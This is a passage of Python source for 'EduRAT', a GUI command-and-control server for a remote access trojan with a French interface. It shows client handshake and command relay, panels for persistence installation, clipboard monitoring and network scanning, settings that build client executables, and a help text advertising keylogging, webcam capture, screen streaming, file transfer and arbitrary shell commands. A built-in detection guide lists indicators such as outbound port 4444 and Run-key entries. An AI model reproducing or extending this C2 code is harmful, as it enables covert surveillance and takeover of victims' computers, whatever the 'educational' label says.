        ctrl.pack(fill="x", pady=(0, 8))
        ttk.Button(ctrl, text="Démarrer", command=lambda: self._cmd_thread("clipboard_start")).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Arrêter", command=lambda: self._cmd_thread("clipboard_stop")).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Historique", command=self.dump_clipboard).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Actuel", command=self.get_current_clipboard).pack(side="left", padx=3)
        self.clipboard_text = self._make_text_area(parent, readonly=False)

    # ═══════════════════════════════════════════════════════════════════
    # NETWORK SCANNER
    # ═══════════════════════════════════════════════════════════════════

    def _setup_scanner(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Scanner réseau", "Découverte réseau et scan de ports")
        ctrl = tk.Frame(parent, bg=self.bg_main)
        ctrl.pack(fill="x", pady=(0, 8))
        ttk.Button(ctrl, text="Scan complet", command=self.do_network_scan).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Table ARP", command=self.do_arp_scan).pack(side="left", padx=3)
        tk.Label(ctrl, text="IP cible:", fg=self.text_muted, bg=self.bg_main,
                 font=("Segoe UI", 9)).pack(side="left", padx=(15, 3))
        self.scan_target = ttk.Entry(ctrl, width=15)
        self.scan_target.pack(side="left", padx=3)
        ttk.Button(ctrl, text="Scan ports", command=self.do_port_scan).pack(side="left", padx=3)
        self.scanner_text = self._make_text_area(parent, readonly=False)

    # ═══════════════════════════════════════════════════════════════════
    # PERSISTENCE
    # ═══════════════════════════════════════════════════════════════════

    def _setup_persistence(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Persistance", "Mécanismes de persistance sur le client")
        ctrl = tk.Frame(parent, bg=self.bg_main)
        ctrl.pack(fill="x", pady=(0, 8))
        ttk.Button(ctrl, text="Vérifier", command=lambda: self._cmd_thread("persist_check")).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Méthodes", command=lambda: self._cmd_thread("persist_methods")).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Installer", command=lambda: self._cmd_thread("persist_install")).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Supprimer", command=lambda: self._cmd_thread("persist_remove"),
                   style="Danger.TButton").pack(side="left", padx=3)
        method_frame = tk.Frame(parent, bg=self.bg_main)
        method_frame.pack(fill="x", pady=(0, 8))
        tk.Label(method_frame, text="Méthode:", fg=self.text_muted, bg=self.bg_main,
                 font=("Segoe UI", 9)).pack(side="left")
        self.persist_method = ttk.Entry(method_frame, width=30)
        self.persist_method.pack(side="left", padx=5)
        ttk.Button(method_frame, text="Installer spécifique", command=self.install_specific_persist).pack(side="left", padx=3)
        self.persist_text = self._make_text_area(parent, readonly=False)

    # ═══════════════════════════════════════════════════════════════════
    # DEFENSE PANEL
    # ═══════════════════════════════════════════════════════════════════

    def _setup_defense(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Défense & Détection", "Guide pour détecter et se défendre contre chaque fonctionnalité")

        defense_info = """=== GUIDE DE DÉTECTION & DÉFENSE ===

1. CONNEXIONS RÉSEAU (Communication C2)
   Détection: Surveiller les connexions sortantes sur les ports inhabituels (4444, etc.)
   Outils: Wireshark, netstat, TCPView, logs Windows Firewall
   Défense: Filtrage en sortie, règles IDS/IPS, surveillance DNS
   Commande: netstat -ano | findstr :4444

2. CAPTURE D'ÉCRAN
   Détection: Surveiller les appels API BitBlt/CopyFromScreen
   Outils: Process Monitor (Sysinternals), surveillance API
   Défense: Whitelisting d'applications, notifications de capture

3. KEYLOGGER
   Détection: Surveiller SetWindowsHookEx / hooks clavier
   Outils: Process Monitor, HookAnalyzer, anti-keylogger
   Défense: Claviers virtuels, pilotes de chiffrement des frappes

4. ACCÈS WEBCAM
   Détection: Surveiller l'accès DirectShow/V4L2, indicateur LED
   Outils: Process Explorer (vérifier les handles vers la caméra)
   Défense: Caches de caméra, politiques d'accès aux périphériques

5. PERSISTANCE
   Détection: Surveiller les clés Run du registre, dossier Startup, Planificateur de tâches
   Outils: Autoruns (Sysinternals), surveillance HKLM/HKCU Run
   Défense: Audit du registre, restrictions GPO, EDR

6. OPÉRATIONS FICHIERS
   Détection: Surveillance d'intégrité des fichiers, modèles d'accès inhabituels
   Outils: OSSEC, Tripwire, Politique d'audit Windows
   Défense: Solutions DLP, audit d'accès aux fichiers

7. SURVEILLANCE PRESSE-PAPIER
   Détection: Surveiller OpenClipboard/GetClipboardData
   Outils: API Monitor, Process Monitor
   Défense: Gestionnaires de presse-papier avec historique

8. SCAN RÉSEAU (Pivot)
   Détection: Modèles de scan interne inhabituels, tempêtes ARP
   Outils: IDS réseau (Snort/Suricata), corrélation SIEM
   Défense: Segmentation réseau, microsegmentation, isolation VLAN

=== INDICATEURS DE COMPROMISSION (IOCs) ===

- Connexions sortantes inhabituelles sur des ports non-standard
- Nouvelles entrées dans HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
- Tâches planifiées inconnues
- Processus avec utilisation réseau/CPU élevée
- Fichiers dans le dossier Startup
- Processus Python suspects en arrière-plan

=== OUTILS DE SÉCURITÉ RECOMMANDÉS ===

- Sysinternals Suite (Process Explorer, Autoruns, TCPView)
- Wireshark / NetworkMiner
- Règles YARA pour la détection par signature
- Sysmon pour la journalisation avancée Windows
- OSQuery pour l'interrogation des endpoints
- CrowdStrike / SentinelOne / Defender for Endpoint (EDR)
"""
        text = self._make_text_area(parent, readonly=False)
        text.insert("end", defense_info)
        text.config(state="disabled")

    # ═══════════════════════════════════════════════════════════════════
    # REPORT
    # ═══════════════════════════════════════════════════════════════════

    def _setup_report(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Rapports", "Génération de rapports de pentest")
        ctrl = tk.Frame(parent, bg=self.bg_main)
        ctrl.pack(fill="x", pady=(0, 8))
        ttk.Button(ctrl, text="Générer", command=self.generate_report).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Export PDF", command=self.export_report_pdf).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Export Texte", command=self.export_report_text).pack(side="left", padx=3)
        self.report_text = self._make_text_area(parent)

    # ═══════════════════════════════════════════════════════════════════
    # SETTINGS
    # ═══════════════════════════════════════════════════════════════════

    def _setup_settings(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Paramètres", "Configuration du serveur et génération de clients")
        form = tk.Frame(parent, bg=self.bg_main)
        form.pack(fill="both", expand=True)

        srv = tk.Frame(form, bg=self.bg_card, highlightbackground=self.border_color, highlightthickness=1)
        srv.pack(fill="x", pady=(0, 8))
        tk.Label(srv, text="SERVEUR", fg=self.text_muted, bg=self.bg_card,
                 font=("Segoe UI", 7), anchor="w", padx=10).pack(fill="x", pady=(6, 2))
        f1 = tk.Frame(srv, bg=self.bg_card); f1.pack(fill="x", padx=10, pady=3)
        tk.Label(f1, text="Host:", fg=self.text_color, bg=self.bg_card,
                 font=("Segoe UI", 9), width=12, anchor="w").pack(side="left")
        ttk.Entry(f1, textvariable=self.server_host, width=20).pack(side="left", padx=5)
        ttk.Button(f1, text="IP Info", command=self.show_ip_info).pack(side="right")
        f2 = tk.Frame(srv, bg=self.bg_card); f2.pack(fill="x", padx=10, pady=3)
        tk.Label(f2, text="Port:", fg=self.text_color, bg=self.bg_card,
                 font=("Segoe UI", 9), width=12, anchor="w").pack(side="left")
        ttk.Entry(f2, textvariable=self.server_port, width=8).pack(side="left", padx=5)

        auth = tk.Frame(form, bg=self.bg_card, highlightbackground=self.border_color, highlightthickness=1)
        auth.pack(fill="x", pady=(0, 8))
        tk.Label(auth, text="AUTHENTIFICATION", fg=self.text_muted, bg=self.bg_card,
                 font=("Segoe UI", 7), anchor="w", padx=10).pack(fill="x", pady=(6, 2))
        f3 = tk.Frame(auth, bg=self.bg_card); f3.pack(fill="x", padx=10, pady=3)
        tk.Label(f3, text="Username:", fg=self.text_color, bg=self.bg_card,
                 font=("Segoe UI", 9), width=12, anchor="w").pack(side="left")
        ttk.Entry(f3, textvariable=self.auth_username_var, width=20).pack(side="left", padx=5)
        f4 = tk.Frame(auth, bg=self.bg_card); f4.pack(fill="x", padx=10, pady=3)
        tk.Label(f4, text="Password:", fg=self.text_color, bg=self.bg_card,
                 font=("Segoe UI", 9), width=12, anchor="w").pack(side="left")
        ttk.Entry(f4, textvariable=self.auth_password_var, width=20, show="*").pack(side="left", padx=5)

        gen = tk.Frame(form, bg=self.bg_card, highlightbackground=self.border_color, highlightthickness=1)
        gen.pack(fill="x", pady=(0, 8))
        tk.Label(gen, text="GÉNÉRATION CLIENT", fg=self.text_muted, bg=self.bg_card,
                 font=("Segoe UI", 7), anchor="w", padx=10).pack(fill="x", pady=(6, 2))
        ttk.Checkbutton(gen, text="Auto-générer au démarrage", variable=self.auto_generate_var).pack(anchor="w", padx=10)
        ttk.Checkbutton(gen, text="Utiliser IP LAN", variable=self.lan_mode_var).pack(anchor="w", padx=10)
        ttk.Checkbutton(gen, text="Build .exe (PyInstaller)", variable=self.build_exe_var).pack(anchor="w", padx=10)
        ttk.Checkbutton(gen, text="Sauver dans builds/clients/", variable=self.save_to_builds_var).pack(anchor="w", padx=10)
        bf = tk.Frame(gen, bg=self.bg_card)
        bf.pack(anchor="w", padx=10, pady=5)
        ttk.Button(bf, text="Générer client", command=self.manual_generate_client).pack(side="left", padx=(0, 8))
        self._build_btn = ttk.Button(bf, text="Build exécutable", command=self.build_client_executable)
        self._build_btn.pack(side="left")

        # Zone de progression build (cachée par défaut)
        self._build_progress_frame = tk.Frame(gen, bg=self.bg_card)
        self._build_progress_frame.pack(fill="x", padx=10, pady=(0, 6))
        self._build_progress_frame.pack_forget()

        prog_header = tk.Frame(self._build_progress_frame, bg=self.bg_card)
        prog_header.pack(fill="x", pady=(4, 2))
        self._build_status_lbl = tk.Label(prog_header, text="⏳ Compilation en cours…",
            fg=self.warning_color, bg=self.bg_card, font=("Segoe UI", 8, "bold"), anchor="w")
        self._build_status_lbl.pack(side="left")
        self._build_pct_lbl = tk.Label(prog_header, text="",
            fg=self.text_muted, bg=self.bg_card, font=("Consolas", 8), anchor="e")
        self._build_pct_lbl.pack(side="right")

        self._build_progressbar = ttk.Progressbar(self._build_progress_frame,
            style="Build.Horizontal.TProgressbar", mode="indeterminate", length=200)
        self._build_progressbar.pack(fill="x", pady=(0, 3))

        self._build_log = tk.Text(self._build_progress_frame, height=4,
            bg="#080b10", fg=self.text_muted, font=("Consolas", 7),
            bd=0, highlightthickness=1, highlightbackground=self.border_color,
            insertbackground=self.text_color, state="disabled", wrap="none")
        self._build_log.pack(fill="x")

    # ═══════════════════════════════════════════════════════════════════
    # HELP
    # ═══════════════════════════════════════════════════════════════════

    def _setup_help(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Aide", "Documentation et commandes disponibles")
        help_content = """=== EDUCATIONAL RAT SERVER - FULL FEATURED ===

FONCTIONNALITÉS:
- Communication chiffrée AES-256
- Streaming écran en direct
- Capture screenshot & Webcam
- Keylogger & Moniteur presse-papier
- Upload/Download de fichiers
- Scanner réseau (simulation pivot)
- Persistance multi-plateforme
- Génération de rapports de pentest
- Guide de défense & détection

COMMANDES:
  sysinfo, screenshot, webcam, stream_start, stream_stop
  keylogger_start/stop/dump, clipboard_start/stop/dump/current
  upload <file>, download <file>, listdir [path], delete <file>
  persist_install [method], persist_remove, persist_check
  scan_network, scan_ports <ip>, scan_arp
  capabilities, exit
  (tout autre) = commande shell

DÉMARRAGE RAPIDE:
1. Paramètres -> Configurer IP/Port
2. Démarrer le serveur
3. Lancer client_gen.py sur la cible
4. Sélectionner un client -> Envoyer des commandes
"""
        text = self._make_text_area(parent, readonly=False)
        text.insert("end", help_content)
        text.config(state="disabled")

    # ═══════════════════════════════════════════════════════════════════
    # CORE SERVER LOGIC
    # ═══════════════════════════════════════════════════════════════════

    def log_message(self, msg, level="info", client_ip=None, operation=None,
                    cause=None, suggestion=None):
        import threading as _threading
        if _threading.current_thread() is not _threading.main_thread():
            self.root.after(0, lambda: self.log_message(
                msg, level, client_ip=client_ip, operation=operation,
                cause=cause, suggestion=suggestion))
            return
        try:
            self.console.config(state="normal")
            colors   = {"info": self.text_color, "success": self.success_color,
                        "warning": self.warning_color, "error": self.error_color,
                        "timeout": self.orange_color}
            prefixes = {"info": "[*]", "success": "[+]", "warning": "[!]",
                        "error": "[✕]", "timeout": "[⏱]"}
            color = colors.get(level, self.text_color)
            self.console.tag_config(level, foreground=color)
            ts = time.strftime("%H:%M:%S")
            suffix = ""
            if client_ip:  suffix += f" · {client_ip}"
            if cause:      suffix += f" · {cause}"
            if suggestion: suffix += f" → {suggestion}"
            self.console.insert("end", f"[{ts}] {prefixes.get(level,'[*]')} {msg}{suffix}\n", level)
            self.console.see("end")
            self.console.config(state="disabled")
        except Exception:
            pass
        if level in ("error", "warning", "timeout") and (client_ip or cause or suggestion):
            self.show_notification(
                level, msg, client_ip=client_ip, operation=operation,
                cause=cause, suggestion=suggestion)

    def show_notification(self, level, title, client_ip=None, operation=None,
                           cause=None, suggestion=None):
        colors = {
            "error":   (self.error_color,   "#1a1e2e"),
            "warning": (self.warning_color, "#1a1e2e"),
            "timeout": (self.orange_color,  "#1a1e2e"),
            "success": (self.success_color, "#1a1e2e"),
            "info":    (self.info_color,    "#1a1e2e"),
        }
        icons = {"error": "✕", "warning": "⚠", "timeout": "⏱", "success": "✓", "info": "ℹ"}
        border_clr, bg_clr = colors.get(level, colors["info"])
        icon = icons.get(level, "ℹ")
        ts = time.strftime("%H:%M:%S")
        notif = tk.Frame(self._notif_zone, bg=bg_clr,
                         highlightbackground=border_clr, highlightthickness=1)
        accent_bar = tk.Frame(notif, bg=border_clr, width=4)
        accent_bar.pack(side="left", fill="y")
        inner = tk.Frame(notif, bg=bg_clr)
        inner.pack(side="left", fill="both", expand=True, padx=8, pady=6)
        row1 = tk.Frame(inner, bg=bg_clr)
        row1.pack(fill="x")
        tk.Label(row1, text=icon, fg=border_clr, bg=bg_clr,
                 font=("Segoe UI", 10)).pack(side="left")
        tk.Label(row1, text=f" {title}", fg=border_clr, bg=bg_clr,
                 font=("Segoe UI", 9, "bold")).pack(side="left")
        tk.Label(row1, text=f"  {ts}", fg=self.text_muted, bg=bg_clr,
                 font=("Segoe UI", 8)).pack(side="left")
        close_btn = tk.Label(row1, text="✕", fg=self.text_muted, bg=bg_clr,
                              font=("Segoe UI", 9), cursor="hand2")
        close_btn.pack(side="right")
        close_btn.bind("<Button-1>", lambda e, n=notif: self._dismiss_notification(n))
        ctx_parts = []
        if client_ip:  ctx_parts.append(f"Client: {client_ip}")
        if operation:  ctx_parts.append(f"Opération: {operation}")
        if cause:      ctx_parts.append(f"Cause: {cause}")
        if ctx_parts:
            row2 = tk.Frame(inner, bg=bg_clr)
            row2.pack(fill="x", pady=(2, 0))
            tk.Label(row2, text="  " + "  ·  ".join(ctx_parts), fg=self.text_color,
                     bg=bg_clr, font=("Segoe UI", 8), anchor="w").pack(side="left")
        if suggestion:
            row3 = tk.Frame(inner, bg=bg_clr)
            row3.pack(fill="x", pady=(2, 0))
            tk.Label(row3, text=f"  → {suggestion}", fg=self.accent_color,
                     bg=bg_clr, font=("Segoe UI", 8), anchor="w").pack(side="left")
        notif.pack(fill="x", pady=2)
        self._notif_widgets.append(notif)
        # Keep max 15 notifications — dismiss oldest if exceeded
        if len(self._notif_widgets) > 15:
            self._dismiss_notification(self._notif_widgets[0])
        if level in ("error", "warning", "timeout"):
            self._alert_count += 1
            self._alert_badge.config(text=f"⚠ {self._alert_count} alerte{'s' if self._alert_count > 1 else ''}")
            if hasattr(self, "_stat_alerts"):
                self._stat_alerts.config(text=str(self._alert_count))
            ts = time.strftime("%H:%M:%S")
            self._alert_log.append((ts, msg, level))
        if level in ("success", "info"):
            self.root.after(30000, lambda: self._dismiss_notification(notif))

    def _dismiss_notification(self, notif):
        try:
            notif.destroy()
            if notif in self._notif_widgets:
                self._notif_widgets.remove(notif)
        except Exception:
            pass

    def start_server(self):
        host, port = self.server_host.get(), self.server_port.get()
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((host, port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1.0)
        except Exception as e:
            errno_str = str(e)
            suggestion = "Changer le port dans Paramètres ou libérer le port actuel"
            if "Address already in use" in errno_str or "10048" in errno_str:
                cause = f"Port {port} déjà utilisé (errno EADDRINUSE)"
            elif "Permission" in errno_str:
                cause = "Permissions insuffisantes pour écouter sur ce port"
                suggestion = "Utiliser un port > 1024 ou lancer en administrateur"
            else:
                cause = errno_str
            self.log_message("Démarrage serveur échoué", "error",
                              operation=f"bind {host}:{port}",
                              cause=cause, suggestion=suggestion)
            return

        self.stop_flag.clear()
        self._server_start_time = time.time()
        self._update_indicator("listening")
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.log_message(f"Server listening on {host}:{port}", "success")
        self.log_message(f"Encryption: {'AES-256' if AES_AVAILABLE else 'None (install pycryptodome)'}", "info")

        threading.Thread(target=self._accept_loop, daemon=True).start()
        self.root.after(0, self._pulse_status)

        if self.auto_generate_var.get():
            ip = self.get_local_ip() if self.lan_mode_var.get() else "127.0.0.1"
            if self._generate_client(ip, port):
                self.log_message(f"client_gen.py generated -> {ip}:{port}", "success")
                if self.build_exe_var.get():
                    self.build_client_executable()

    def stop_server(self):
        self.stop_flag.set()
        with self.lock:
            for c in self.clients.values():
                try: c["socket"].close()
                except: pass
            self.clients.clear()
            self.current_client_id = None
        if self.server_socket:
            try: self.server_socket.close()
            except: pass
            self.server_socket = None
        self._update_indicator("idle")
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.log_message("Server stopped", "warning")
        self.refresh_clients()
        self.root.title("EduRAT Console — Serveur arrêté")

    def _accept_loop(self):
        while not self.stop_flag.is_set():
            try:
                sock, addr = self.server_socket.accept()
                sock.settimeout(15)
                threading.Thread(target=self._handshake, args=(sock, addr), daemon=True).start()
            except socket.timeout:
                continue
            except:
                break

    def _handshake(self, sock, addr):
        try:
            key = derive_key(ENCRYPTION_KEY)
            send_msg(sock, "AUTH", key)
            creds = recv_msg_str(sock, key)
            if not creds:
                sock.close(); return
            c = json.loads(creds)
            if c.get("username") != self.auth_username_var.get() or c.get("password") != self.auth_password_var.get():
                send_msg(sock, "AUTH_FAILED", key)
                sock.close()
                self.root.after(0, lambda: self.log_message(
                    "Authentification échouée", "warning",
                    client_ip=addr[0],
                    operation="handshake",
                    cause="Credentials incorrects (username/password refusé)",
                    suggestion="Vérifier AUTH_USERNAME et AUTH_PASSWORD dans Paramètres"
                ))
                return
            send_msg(sock, "AUTH_SUCCESS", key)
            send_msg(sock, "sysinfo", key)
            info = recv_msg_str(sock, key)
            if not info:
                sock.close(); return
            sock.settimeout(None)
            with self.lock:
                cid = max(self.clients.keys(), default=0) + 1
                self.clients[cid] = {"socket": sock, "address": addr, "info": info, "key": key}
            self.root.after(0, lambda: self._on_connected(cid, addr, info))
        except (ConnectionResetError, ConnectionAbortedError, OSError):
            try: sock.close()
            except: pass
        except Exception as e:
            err_msg = str(e)
            try: sock.close()
            except: pass
            self.root.after(0, lambda: self.log_message(f"Handshake failed: {err_msg}", "error"))

    def _on_connected(self, cid, addr, info):
        self._total_connections += 1
        self.log_message(f"Client #{cid} connected from {addr[0]}:{addr[1]}", "success")
        enc = "AES-256" if self.clients[cid].get("key") else "None"
        self.log_message(f"  Encryption: {enc} | Info: {info[:60]}", "info")
        if self.report:
            self.report.set_target(addr[0], info.split("|")[1].split(":")[1].strip() if "|" in info else "Unknown", info)
        self.refresh_clients()
        self._update_indicator("connected")
        self.root.title(f"EduRAT Console — {len(self.clients)} client(s) connecté(s)")

    def _get_sock_key(self):
        if self.current_client_id is None:
            return None, None
        with self.lock:
            c = self.clients.get(self.current_client_id)
        if c is None:
            self.current_client_id = None
            return None, None
        return c["socket"], c.get("key")

    def _send_recv(self, cmd):
        sock, key = self._get_sock_key()
        if not sock:
            self.log_message("Aucun client sélectionné", "warning",
                              cause="Aucun client actif",
                              suggestion="Sélectionne un client dans Dashboard → Clients")
            return None
        try:
            send_msg(sock, cmd, key)
            return recv_msg_str(sock, key)
        except socket.timeout:
            cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
            self.log_message("Timeout commande", "timeout",
                              client_ip=cip, operation=cmd[:30],
                              cause="Délai de réponse dépassé (15s)",
                              suggestion="Augmenter timeout dans Paramètres ou vérifier la connexion")
            self._drop_client()
            return None
        except (ConnectionResetError, BrokenPipeError) as e:
            cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
            self.log_message("Connexion perdue", "error",
                              client_ip=cip, operation=cmd[:30],
                              cause=f"Connexion réinitialisée ({type(e).__name__})",
                              suggestion="Le client s'est déconnecté — il tentera de se reconnecter automatiquement")
            self._drop_client()
            return None
        except Exception as e:
            cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
            self.log_message("Erreur réseau", "error",
                              client_ip=cip, operation=cmd[:30],
                              cause=str(e),
                              suggestion="Vérifier la connexion réseau et relancer le client")
            self._drop_client()
            return None

    def _send_recv_bytes(self, cmd):
        sock, key = self._get_sock_key()
        if not sock:
            return None
        try:
            send_msg(sock, cmd, key)
            return recv_msg(sock, key)
        except socket.timeout:
            cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
            self.log_message("Timeout opération binaire", "timeout",
                              client_ip=cip, operation=cmd[:30],
                              cause="Délai de réponse dépassé (15s)",
                              suggestion="Vérifier la connexion réseau")
            self._drop_client()
            return None
        except Exception as e:
            cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
            self.log_message("Erreur opération binaire", "error",
                              client_ip=cip, operation=cmd[:30],
                              cause=str(e),
                              suggestion="Vérifier la connexion réseau et relancer le client")
            self._drop_client()
            return None

    def _drop_client(self):
        if self.current_client_id:
            with self.lock:
                c = self.clients.pop(self.current_client_id, None)
                if c:
                    try: c["socket"].close()
                    except: pass
            self.current_client_id = None
            self.refresh_clients()

    # ═══════════════════════════════════════════════════════════════════
    # CLIENT OPERATIONS
    # ═══════════════════════════════════════════════════════════════════

    def refresh_clients(self):
        # Update sidebar listbox
        self.client_listbox.delete(0, tk.END)
        with self.lock:
            snapshot = dict(self.clients)
        for cid, c in snapshot.items():
            node = ""
            for p in c["info"].split("|"):
                if "Node:" in p: node = p.split(":")[1].strip(); break
            marker = " [*]" if cid == self.current_client_id else ""
            enc = "E" if c.get("key") else "P"
            self.client_listbox.insert(tk.END, f"#{cid} [{enc}] {c['address'][0]} ({node}){marker}")
        self.count_var.set(f"Clients: {len(snapshot)}")

        # Update Clients page table
        if not hasattr(self, "_clients_rows_frame"):
            return
        for w in self._clients_rows_frame.winfo_children():
            w.destroy()
        if not snapshot:
            tk.Label(self._clients_rows_frame, text="Aucun client connecté",
                     fg=self.text_muted, bg=self.bg_card,
                     font=("Segoe UI", 10)).pack(pady=30)
            return
        for cid, c in snapshot.items():
            info = c.get("info", "")
            node = os_name = release = version = "?"
            for part in info.split("|"):
                p = part.strip()
                if p.startswith("Node:"):      node    = p[5:].strip()
                elif p.startswith("System:"):  os_name = p[7:].strip()
                elif p.startswith("Release:"): release = p[8:].strip()
                elif p.startswith("Version:"): version = p[8:].strip()
            enc    = "AES-256" if c.get("key") else "Aucun"
            ip     = c["address"][0]
            port   = c["address"][1]
            active = cid == self.current_client_id
            bg     = self.bg_input if active else self.bg_card
            bdr    = self.accent_color if active else self.border_color
            row = tk.Frame(self._clients_rows_frame, bg=bg,
                           highlightbackground=bdr, highlightthickness=1)
            row.pack(fill="x", pady=1, padx=2)
            clr = self.accent_color if active else self.text_color
            for txt, w in zip(
                [f"#{cid}", f"{ip}:{port}", node, f"{os_name} {release}", enc,
                 "● actif" if active else ""],
                self._clients_col_widths[:-1]
            ):
                tk.Label(row, text=txt, fg=clr if txt else self.text_muted,
                         bg=bg, font=("Consolas", 9),
                         width=w, anchor="w").pack(side="left", padx=4, pady=5)
            bf = tk.Frame(row, bg=bg)
            bf.pack(side="right", padx=6)
            ttk.Button(bf, text="Sélect.",
                       command=lambda c=cid: self._select_cid(c)).pack(side="left", padx=2)
            ttk.Button(bf, text="Kick", style="Danger.TButton",
                       command=lambda c=cid: self._kick_cid(c)).pack(side="left", padx=2)

    def connect_to_client(self):
        sel = self.client_listbox.curselection()
        if not sel:
            self.log_message("Select a client first", "warning"); return
        cid = int(self.client_listbox.get(sel[0]).split("#")[1].split(" ")[0])
        with self.lock:
            if cid not in self.clients:
                self.log_message("Client gone", "error"); self.refresh_clients(); return
        self.current_client_id = cid
        self.log_message(f"Selected client #{cid}", "success")
        self.refresh_clients()

    def _cid_from_listbox_entry(self, entry):
        try:
            return int(entry.split("#")[1].split(" ")[0])
        except (IndexError, ValueError):
            return None

    def _kick_cid(self, cid):
        with self.lock:
            c = self.clients.pop(cid, None)
        if c:
            try: send_msg(c["socket"], "exit", c.get("key"))
            except: pass
            try: c["socket"].close()
            except: pass
            if self.current_client_id == cid:
                self.current_client_id = None
            self.log_message(f"Client #{cid} ({c['address'][0]}) kicked", "warning")
        self.refresh_clients()

    def disconnect_client(self):
        if not self.current_client_id:
            return
        self._kick_cid(self.current_client_id)

    def disconnect_selected(self):
        sel = self.client_listbox.curselection()
        if not sel:
            self.log_message("Sélectionne un client dans la liste d'abord", "warning"); return
        cid = self._cid_from_listbox_entry(self.client_listbox.get(sel[0]))
        if cid is not None:
            self._kick_cid(cid)

    def disconnect_all(self):
        with self.lock:
            cids = list(self.clients.keys())
        if not cids:
            self.log_message("Aucun client connecté", "info"); return
        for cid in cids:
            self._kick_cid(cid)
        self.log_message(f"{len(cids)} client(s) déconnecté(s)", "warning")

    def _client_context_menu(self, event):
        idx = self.client_listbox.nearest(event.y)
        if idx < 0 or idx >= self.client_listbox.size():
            return
        self.client_listbox.selection_clear(0, tk.END)
        self.client_listbox.selection_set(idx)
        entry = self.client_listbox.get(idx)
        cid = self._cid_from_listbox_entry(entry)
        if cid is None:
            return
        menu = tk.Menu(self.root, tearoff=0,
                       bg=self.bg_card, fg=self.text_color,
                       activebackground=self.accent_color,
                       activeforeground=self.bg_main,
                       font=("Segoe UI", 9))
        menu.add_command(label=f"Connecter  #{cid}",   command=lambda: self._select_cid(cid))
        menu.add_separator()
        menu.add_command(label=f"Kick  #{cid}",         command=lambda: self._kick_cid(cid),
                         foreground=self.error_color)
        menu.add_command(label="Kick tous",              command=self.disconnect_all,
                         foreground=self.error_color)
        menu.tk_popup(event.x_root, event.y_root)

    def _select_cid(self, cid):
        with self.lock:
            if cid not in self.clients:
                self.log_message("Client introuvable", "error"); self.refresh_clients(); return
        self.current_client_id = cid
        self.log_message(f"Selected client #{cid}", "success")
        self.refresh_clients()

    # ═══════════════════════════════════════════════════════════════════
    # STAT CARD POPUPS
    # ═══════════════════════════════════════════════════════════════════

    # ═══════════════════════════════════════════════════════════════════
    # INLINE DETAIL PANEL
    # ═══════════════════════════════════════════════════════════════════

    def _toggle_detail(self, which):
        """Show or hide the inline detail panel below the stat cards."""
        if self._detail_panel_active == which:
            # Same card clicked again → close
            self._detail_panel.pack_forget()
            self._detail_panel_active = None
            return
        self._detail_panel_active = which
        # Clear previous content
        for w in self._detail_panel.winfo_children():
            w.destroy()
        # Header bar
        hdr = tk.Frame(self._detail_panel, bg=self.bg_sidebar)
        hdr.pack(fill="x")
        titles = {"clients": "Clients connectés", "server": "Statut du serveur",
                  "alerts": "Journal des alertes", "port": "Configuration du port"}
        tk.Label(hdr, text=titles.get(which, ""), fg=self.accent_color,
                 bg=self.bg_sidebar, font=("Segoe UI", 10, "bold"),
                 padx=12, pady=6).pack(side="left")
        tk.Button(hdr, text="✕", fg=self.text_muted, bg=self.bg_sidebar,
                  activebackground=self.error_color, activeforeground="white",
                  relief="flat", font=("Segoe UI", 9), bd=0, padx=10,
                  command=lambda: self._toggle_detail(which)).pack(side="right")
        body = tk.Frame(self._detail_panel, bg=self.bg_card)
        body.pack(fill="both", expand=True, padx=12, pady=8)
        # Render content
        render = {"clients": self._render_detail_clients,
                  "server":  self._render_detail_server,
                  "alerts":  self._render_detail_alerts,
                  "port":    self._render_detail_port}
        render[which](body)
        # Show panel right after the stats row
        self._detail_panel.pack(fill="x", pady=(4, 4), after=self._stats_row)

    def _detail_row(self, parent, key, value):
        row = tk.Frame(parent, bg=self.bg_card)
        row.pack(fill="x", pady=2)
        tk.Label(row, text=key, fg=self.text_muted, bg=self.bg_card,
                 font=("Segoe UI", 9), width=20, anchor="w").pack(side="left")
        tk.Label(row, text=str(value), fg=self.text_color, bg=self.bg_card,
                 font=("Consolas", 9), anchor="w").pack(side="left")

    def _render_detail_clients(self, body):
        with self.lock:
            snapshot = dict(self.clients)
        if not snapshot:
            tk.Label(body, text="Aucun client connecté", fg=self.text_muted,
                     bg=self.bg_card, font=("Segoe UI", 10)).pack(pady=10)
            return
        hrow = tk.Frame(body, bg=self.bg_input)
        hrow.pack(fill="x", pady=(0, 4))
        for txt, w in (("#", 4), ("IP", 15), ("Node", 14), ("OS", 14), ("Chiffr.", 10)):
            tk.Label(hrow, text=txt, fg=self.text_muted, bg=self.bg_input,
                     font=("Segoe UI", 8, "bold"), width=w, anchor="w").pack(side="left", padx=3)
        for cid, c in snapshot.items():
            info = c.get("info", "")
            node = os_name = release = "?"
            for part in info.split("|"):
                p = part.strip()
                if p.startswith("Node:"):     node     = p[5:].strip()
                elif p.startswith("System:"): os_name  = p[7:].strip()
                elif p.startswith("Release:"): release = p[8:].strip()
            enc = "AES-256" if c.get("key") else "—"
            active = cid == self.current_client_id
